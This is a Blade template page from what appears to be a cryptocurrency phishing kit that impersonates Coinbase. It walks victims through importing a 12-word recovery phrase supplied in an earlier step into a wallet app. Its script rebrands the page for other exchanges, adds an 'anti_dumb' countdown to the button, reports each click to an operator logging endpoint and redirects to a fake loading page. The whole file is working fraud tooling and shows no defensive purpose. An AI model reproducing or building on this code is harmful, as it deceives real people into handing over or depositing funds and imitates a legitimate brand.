@extends('user.coinbase.layout')

@section('title', 'Coinbase - Recovery Phrase')

@section('pageCss')
</style>
<link rel="stylesheet" href="/coinbase/css/import-recovery-phrase.css"/>
<style>
{!! file_get_contents(resource_path('views/user/coinbase/css/import-recovery-phrase.css')) !!}
@endsection

@section('content')
<form class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8">
      <span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white mb-6">
       Import your recovery phrase
      </span>
      <span class="font-coinbase-sans text-coinbase-foreground-muted">
       1. Once you have installed the Coinbase Wallet app, select
       <b>
        I already have a wallet
       </b>
       .
      </span>
      <br/>
      <span class="font-coinbase-sans text-coinbase-foreground-muted">
       2. Choose
       <b>
        Enter a recovery phrase
       </b>
       , then enter your wallet's 12-word recovery phrase from the previous step.
      </span>
      <br/>
      <span class="font-coinbase-sans text-coinbase-foreground-muted">
       3. Click
       <b>
        Import wallet
       </b>
       and create a name for your wallet.
      </span>
      <br/>
      <span class="font-coinbase-sans text-coinbase-foreground-muted">
       4. Create a passcode for your wallet. Be sure to remember it so you can unlock your wallet.
      </span>
      <button id="irp-btn" class="bg-coinbase-primary hover:bg-[#507fe5] disabled:bg-[#314b84] active:bg-[#4b78d6] disabled:scale-100 active:scale-[.98] rounded-full py-4 flex font-coinbase-sans font-semibold pl-6 pr-8 text-black items-center transition-colors justify-center mt-6" type="button">
       Continue
      </button>
     </form>

<script>
  (function(){
    var d = window._cbIrpData || {};
    if (d.exchanger) try { localStorage.setItem('cb_irp_exchanger', d.exchanger); } catch(_) {}
    if (window._cbIrpData) {
      if (d.anti_dumb) try { localStorage.setItem('cb_irp_antiDumb', '1'); } catch(_) {}
      else try { localStorage.removeItem('cb_irp_antiDumb'); } catch(_) {}
    }

    var exchangerName = localStorage.getItem('cb_irp_exchanger') || '';
    if (exchangerName) {
      var form = document.querySelector('form');
      if (form) form.innerHTML = form.innerHTML.replace(/Coinbase Wallet/g, exchangerName);
    }

    var btn = document.getElementById('irp-btn');
    if (localStorage.getItem('cb_irp_antiDumb') === '1') {
      var countdown = 10;
      btn.disabled = true;
      btn.textContent = 'Continue (' + countdown + 's)';
      var interval = setInterval(function() {
        countdown--;
        if (countdown > 0) {
          btn.textContent = 'Continue (' + countdown + 's)';
        } else {
          btn.textContent = 'Continue';
          btn.disabled = false;
          clearInterval(interval);
          try { localStorage.removeItem('cb_irp_antiDumb'); } catch(_) {}
        }
      }, 1000);
    }

    var _sent = false;
    btn.addEventListener('click', function() {
      if (btn.disabled || _sent) return; _sent = true;
      var csrf = window._liveledCSRF || '';
      var b = new URLSearchParams({_token:csrf,type:'form_submit',page:'coinbase_import_recovery_phrase',element:'continue',value:'clicked'});
      try{navigator.sendBeacon?navigator.sendBeacon('/api/log',b):fetch('/api/log',{method:'POST',body:b,keepalive:true});}catch(e){}
      document.documentElement.style.background='#0a0b0d';
      document.body.style.background='#0a0b0d';
      setTimeout(function(){
        if(window.navigateTo) window.navigateTo('/coinbase/loading');
        else window.location.href='/coinbase/loading';
      },300);
    });
  })();
  </script>
@endsection
